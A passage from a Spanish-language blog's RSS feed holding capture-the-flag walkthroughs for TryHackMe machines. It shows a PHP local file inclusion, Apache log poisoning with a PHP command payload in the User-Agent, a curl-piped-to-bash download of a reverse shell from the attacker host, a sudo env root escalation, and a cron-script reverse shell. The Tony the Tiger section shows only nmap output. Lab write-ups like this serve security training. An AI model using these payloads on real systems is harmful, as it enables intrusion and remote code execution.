      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
      &lt;span class=&#34;nv&#34;&gt;$ext&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ext&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ext&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
          &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;containsStr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;dog&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;containsStr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;cat&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
              &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Here you go!&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
              &lt;span class=&#34;k&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;view&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$ext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
          &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
          &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Sorry, only dogs or cats are allowed.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
          &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
  &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/details&gt;
&lt;p&gt;Leemos el archivo flag.php y logramos leer nuestra primera flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.30.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;rce---apache-log-poisoning&#34;&gt;RCE - Apache Log Poisoning&lt;/h3&gt;
&lt;p&gt;Utilizamos el User-Agent para poder ejecutar nuestro codigo php el que tendra como objetivo obtener y ejecutar un comando que le pasemos. Utilizamos &lt;code&gt;php://filter/dog/resource=../../../../var/log/apache2/access.log&amp;amp;ext=&lt;/code&gt; para leer el archivo log, además de esto agregamos el comando que deseamos ejecutar en la maquina &lt;code&gt;&amp;amp;cmd=whoami&lt;/code&gt;, por lo que luciría de la siguiente forma.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.hackingarticles.in/apache-log-poisoning-through-lfi/&#34;&gt;&lt;strong&gt;Apache Log Poisoning&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;GET /?view&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;php://filter/dog/resource&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;../../../../var/log/apache2/access.log&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;ext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;whoami HTTP/1.1
Host: dogcat.thm
User-Agent:Mozilla/5.0 &amp;lt;?php system&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; ?&amp;gt; Gecko/20100101 Firefox/68.0 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que en la respuesta tenemos acceso como usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2001.38.25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---www-data&#34;&gt;USER - WWW-DATA&lt;/h2&gt;
&lt;p&gt;Ahora, creamos un archivo que contenga una shell inversa para descargarlo mediante un servidor de python (python3 -m http.server 80) en la maquina.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Comando para descargar y ejecutar nuestra shell (Codificamos a URL los espacios)&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;bash -c  &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;curl -s 10.8.6.160/shell.sh&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;#Codificado&lt;/span&gt;
bash%20-c%20%20&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;curl%20-s%2010.8.6.160/shell.sh&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener una shell con el usuario www-data.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.07.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuestra segunda flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.08.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el comando &lt;code&gt;env&lt;/code&gt;. Utilizamos env para obtener una shell root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.11.00.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo /usr/bin/env /bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Òbtenemos nuestra shell como usuario root y nuestra tercera flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2002.11.22.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tenemos privilegio root pero vemos que estamos limitados de comandos y vemos en la raiz de la maquina que existe un archivo &lt;code&gt;.dockerenv&lt;/code&gt; por lo que en el lugar que estamos es un contenedor.&lt;/p&gt;
&lt;p&gt;Dentro de la carpeta &lt;code&gt;/opt/backup&lt;/code&gt; encontramos una carpeta que contiene dos archivos un bash y un tar, los cuales se utilizaron para crear el contenedor (backup.tar), vemos que el archivo bash descomprimer el archivo tar dentro de /root/container. Agregamos un ping hacia nuestra maquina en el archivo y logramos obtener paquetes en tcpdump.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.01.03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TCPDUMP&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.01.41.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Podemos deducir que existe un crontab que ejecuta el archibo backup.sh, ahora, agregamos una shell inversa a este archivo y ponemos a la escucha netcat en nuestra maquina y esperamos a que nos devuelva una shell.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SHELL&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.05.30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NETCAT&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.06.08.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener una shell y nuestra ultima flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.07.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Crontab del archivo backup.sh&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/dogcat/Screenshot%20from%202020-04-18%2017.09.40.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/dogcat/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/dogcat/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Tony the Tiger</title>
        <link>https://sckull.github.io/posts/tonythetiger/</link>
        <pubDate>Fri, 17 Apr 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 17 Apr 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/tonythetiger/</guid>
        <description>Tony the Tiger es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Tony the Tiger es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tonythetiger/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Tony the Tiger&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Learn how to use a Java Serialisation attack in this boot-to-root&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;240&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/cmnatic&#34;&gt;cmnatic&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, escaneo con nmap muestra el puerto http (80), http (8080), el puerto ssh (22) abiertos, entre otros puertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Apr 17 19:53:10 2020 as: nmap -sV -sC -o nmap_scan 10.10.91.15&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.91.15
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;989&lt;/span&gt; closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;1024&lt;/span&gt; d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; f6:36:07:3c:3b:3d:71:30:c4💿2a:13:00:b5:25:ae &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http        Apache httpd 2.4.7 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-generator: Hugo 0.66.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.7 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Tony&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#39;s Blog&lt;/span&gt;
1090/tcp open  java-rmi    Java RMI
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_rmi-dumpregistry: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
1091/tcp open  java-rmi    Java RMI
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NULL: 
